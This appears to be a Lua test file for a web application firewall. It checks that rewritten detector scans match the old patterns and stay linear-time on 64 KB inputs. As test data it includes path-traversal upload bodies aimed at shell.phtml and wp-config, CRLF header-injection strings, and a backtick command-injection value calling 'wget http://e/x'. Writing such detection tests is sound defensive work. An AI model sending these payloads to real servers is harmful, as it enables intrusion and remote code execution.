-- Linear rewrites of five quadratic scans in cfm_waf_detectors.lua (edge Lua
-- sweep 2026-10-09, C4). Each old form restarted a pattern at every byte of a
-- crafted run and ran it to the run's end, so one unauthenticated request cost
-- 20 ms to over a second of worker CPU:
--   * rule 10017's legacy multipart scan   (`-name=-name=…`, 0.5-1.3 s)
--   * rule 10010's gform_unique_id lookup  (name=… without a blank line, ~0.3 s)
--   * detect_debug_toggles' key=value walk (`aaaa…`, ~30 ms at the 2 KB cap)
--   * detect_crlf_injection's [\r\n]%W*kw   (newlines, 35-100 ms)
--   * detect_cmd_payload's `&&` exemption and search-field walk
--
-- The four exact rewrites are fuzzed against the original pattern on seeded
-- random strings over the bytes that matter (any difference fails); 10017's
-- reads a bounded name head and is pinned by cases. Every rewrite must also
-- stay fast on 64 KB of its worst input, where the old forms took seconds.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end
local function show(s) return (s:gsub("[%c]", function(c) return ("\\x%02x"):format(c:byte()) end)) end

local function rand_str(alpha, maxn)
  local t = {}
  for i = 1, math.random(0, maxn) do t[i] = alpha[math.random(#alpha)] end
  return table.concat(t)
end

local function elapsed_ms(fn)
  local t0 = os.clock()
  fn()
  return (os.clock() - t0) * 1000
end

math.randomseed(20261009)
local N = 40000

-- ── crlf_then == s:find("[\r\n]%W*" .. kw) ─────────────────────────────────
do
  local alpha = { "\r", "\n", " ", "-", ":", "\t", "_", "%", "a", "Z", "0", "\128",
                  "location", "location:", "set-cookie", "content-type", " :" }
  local kws = { "content%-type%s*:", "content%-length%s*:", "set%-cookie%s*:", "location%s*:" }
  local bad = 0
  for _ = 1, N do
    local s = rand_str(alpha, 14)
    for _, kw in ipairs(kws) do
      local want = s:find("[\r\n]%W*" .. kw) ~= nil
      if det.crlf_then(s, kw) ~= want then
        bad = bad + 1
        if bad <= 5 then check(false, "crlf_then(" .. show(s) .. ", " .. kw .. ") ~= old pattern") end
      end
    end
  end
  check(bad == 0, "crlf_then differs from the old pattern in " .. bad .. " cases")
end

-- ── each_kv == gmatch("(K+)=(V)") ──────────────────────────────────────────
do
  local alpha = { "a", "b", "0", "_", "-", "=", "&", "?", "&&", "%", ".", "Q", " ", "`", "q=", "s=" }
  local function via_gmatch(s, pat)
    local out = {}
    for k, v in s:gmatch(pat) do out[#out + 1] = k .. "\0" .. v end
    return table.concat(out, "\1")
  end
  local function via_each(s, keyb, nonempty)
    local out = {}
    det.each_kv(s, keyb, nonempty, function(k, v) out[#out + 1] = k .. "\0" .. v end)
    return table.concat(out, "\1")
  end
  local bad = 0
  for _ = 1, N do
    local s = rand_str(alpha, 16)
    if via_each(s, det.KV_DBG_KEY, false) ~= via_gmatch(s, "([^&=?]+)=([^&]*)") then
      bad = bad + 1
      if bad <= 5 then check(false, "each_kv(dbg) ~= gmatch on " .. show(s)) end
    end
    if via_each(s, det.KV_CMD_KEY, true) ~= via_gmatch(s, "([a-z0-9_%-]+)=([^&]+)") then
      bad = bad + 1
      if bad <= 5 then check(false, "each_kv(cmd) ~= gmatch on " .. show(s)) end
    end
  end
  check(bad == 0, "each_kv differs from gmatch in " .. bad .. " cases")
  -- An fn returning true stops the walk.
  local seen = 0
  check(det.each_kv("a=1&b=2&c=3", det.KV_DBG_KEY, false, function(k)
    seen = seen + 1; return k == "b" end) == true and seen == 2, "each_kv stops when fn returns true")
end

-- ── has_amp_amp_value == match("[%?&][^=]+=[^&]*&&[a-z0-9_%-]+=") ─────────
do
  local alpha = { "?", "&", "&&", "=", "a", "b", "_", "-", "|", "x=", "%", "A" }
  local bad = 0
  for _ = 1, N do
    local s = rand_str(alpha, 16)
    local want = s:match("[%?&][^=]+=[^&]*&&[a-z0-9_%-]+=") ~= nil
    if det.has_amp_amp_value(s) ~= want then
      bad = bad + 1
      if bad <= 5 then check(false, "has_amp_amp_value(" .. show(s) .. ") ~= old pattern") end
    end
  end
  check(bad == 0, "has_amp_amp_value differs from the old pattern in " .. bad .. " cases")
end

-- ── gform_unique_id_value == the old two-pattern lookup ────────────────────
do
  local alpha = { 'name="gform_unique_id"', 'Name="gform_unique_id"', "gform_unique_id=", "\r", "\n",
                  "\r\n\r\n", "\n\n", "&", "x", "../", ".phtml", '"', "=" }
  local bad = 0
  for _ = 1, N do
    local b = rand_str(alpha, 12)
    local want = b:match('[Nn]ame="gform_unique_id".-\r?\n\r?\n([^\r\n]*)')
              or b:match("gform_unique_id=([^&\r\n]*)")
    if det.gform_unique_id_value(b) ~= want then
      bad = bad + 1
      if bad <= 5 then check(false, "gform_unique_id_value(" .. show(b) .. ") ~= old lookup") end
    end
  end
  check(bad == 0, "gform_unique_id_value differs from the old lookup in " .. bad .. " cases")
  check(det.detect_cve_gf_multi_uploader("/", "post", "gf_page=upload",
          'Content-Disposition: form-data; name="gform_unique_id"\r\n\r\n../../../x/shell.phtml\r\n')
        == "TRAVERSAL_PHTML", "10010 still fires on the exploit body")
end

-- ── rule 10017's legacy multipart scan ─────────────────────────────────────
-- The boundary in the header is not in the body, so PHP's reader splits
-- nothing and only the legacy scan can answer.
do
  local h = { ["content-type"] = "multipart/form-data; boundary=zzzz" }
  local function scan(cd)
    return det.detect_cve_wp_pagename_traversal("/", "post", "",
      "--x\r\nContent-Disposition: form-data; " .. cd .. "\r\n\r\n../../../../wp-config\r\n--x--\r\n", h)
  end
  for _, cd in ipairs({
    'name="pagename"', "name=pagename", "name='pagename'", 'name="   pagename"', 'NAME="PageName"',
    'name="%70agename"', 'name="%2570agename"', 'name="%25%37%30agename"', 'name="pagename%00x"',
    'name="pagename\0x"', 'name="pagename[]"', 'name="pagename[a]"', 'name = "pagename"',
    'name="' .. ("%25%37%30"):rep(1) .. '%25%36%31%25%36%37%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%30%30"',
    'x=1; name="pagename"', 'filename="a"; name="pagename"',
  }) do
    check(scan(cd) == "BODY", "legacy scan still reads " .. show(cd))
  end
  for _, cd in ipairs({
    'name="pagenames"', 'filename="pagename"', 'name="xpagename"', 'name="page name"',
    'name="pagename[x"', 'name="a-name=pagename"', "name=a-name=pagename",
  }) do
    check(scan(cd) == nil, "legacy scan does not read " .. show(cd))
  end
  -- Many names before one blank line: the value is still checked.
  check(det.detect_cve_wp_pagename_traversal("/", "post", "",
          ("; name=x\n"):rep(500) .. "; name=pagename\r\n\r\n../../x", h) == "BODY",
        "a pagename name after many others is still read")
end

-- ── Scaling: 64 KB of each worst input ─────────────────────────────────────
do
  local K = 65536
  local LIMIT = 250  -- ms; the old forms take seconds on these (1-34 s measured)
  local mp = { ["content-type"] = "multipart/form-data; boundary=zzzz" }
  local cases = {
    { "10017 -name=",   function() det.detect_cve_wp_pagename_traversal("/", "post", "", ("-name="):rep(K / 6), mp) end },
    { "10017 %name=",   function() det.detect_cve_wp_pagename_traversal("/", "post", "", ("%name="):rep(K / 6), mp) end },
    { "10017 ;name=pagename\\n", function()
        det.detect_cve_wp_pagename_traversal("/", "post", "", (";name=pagename\n"):rep(K / 15) .. "\r\n\r\nok", mp) end },
    { "10010 name=",    function() det.gform_unique_id_value(('name="gform_unique_id"'):rep(K / 22)) end },
    { "crlf \\n",       function() det.crlf_then(("\n"):rep(K), "location%s*:") end },
    { "crlf \\n-",      function() det.crlf_then(("\n-"):rep(K / 2), "set%-cookie%s*:") end },
    { "kv aaaa",        function() det.each_kv(("a"):rep(K), det.KV_DBG_KEY, false, function() end) end },
    { "kv aaaa`",       function() det.each_kv(("a"):rep(K) .. "`", det.KV_CMD_KEY, true, function() end) end },
    { "kv a=a=",        function() det.each_kv(("a="):rep(K / 2), det.KV_DBG_KEY, false, function() end) end },
    -- No pair at any `=` (empty key / empty value) and no `&`: still one pass.
    { "kv ?=?=",        function() det.each_kv(("?="):rep(K / 2), det.KV_DBG_KEY, false, function() end) end },
    { "kv !=!=",        function() det.each_kv(("!="):rep(K / 2), det.KV_CMD_KEY, true, function() end) end },
    { "kv a=a= nonempty", function() det.each_kv(("a="):rep(K / 2), det.KV_CMD_KEY, true, function() end) end },
    { "10017 quoted spaces", function()
        det.detect_cve_wp_pagename_traversal("/", "post", "", ('-name="' .. (" "):rep(200)):rep(K / 207), mp) end },
    { "&&& =",          function() det.has_amp_amp_value(("&"):rep(K) .. "=") end },
    { "?a=b?a=b &&k",   function() det.has_amp_amp_value(("?a=b"):rep(K / 8) .. "&&" .. ("k"):rep(K / 2)) end },
    { "&a&a",           function() det.has_amp_amp_value(("&a"):rep(K / 2)) end },
  }
  for _, c in ipairs(cases) do
    local ms = elapsed_ms(c[2])
    check(ms < LIMIT, ("%s took %.1f ms on 64 KB (limit %d)"):format(c[1], ms, LIMIT))
  end
end

-- ── The detectors that use them still answer as before ─────────────────────
do
  check(det.detect_debug_toggles("a=1&xdebug_session_start=phpstorm") == "DBG_XDEBUG", "debug: xdebug session")
  check(det.detect_debug_toggles("x=1&debug=true") == "DBG_DEBUG", "debug: debug=true")
  check(det.detect_debug_toggles("debug=0") == nil, "debug: debug=0 is not a toggle")
  check(det.detect_debug_toggles("a?trace=1") == "DBG_TRACE", "debug: key after ?")
  check(det.detect_cmd_payload("q=`id`") == nil, "cmd: a benign backtick in a search field is suppressed")
  check(det.detect_cmd_payload("q=`id`&x=`wget http://e/x`") == "PAY_BACKTICK",
        "cmd: a backtick command outside the search field still fires")
  check(det.detect_cmd_payload("?a=b&&c=d") == nil, "cmd: the && exemption still applies")
  check(det.detect_crlf_injection("x=%0d%0aSet-Cookie:%20a=b", "") == "CRLF_URL_ENCODED", "crlf: encoded set-cookie")
  check(det.detect_crlf_injection("x=\r\n Location: //e", "") == "CRLF_LOCATION", "crlf: raw location")
  check(det.detect_crlf_injection("", "a\r\nContent-Type: text/html") == nil, "crlf: a body content-type stays exempt")
end

if fails > 0 then
  io.stderr:write(("cfm_waf linear-scan tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf linear scans (10017, 10010, debug_toggles, crlf, cmd_payload)")
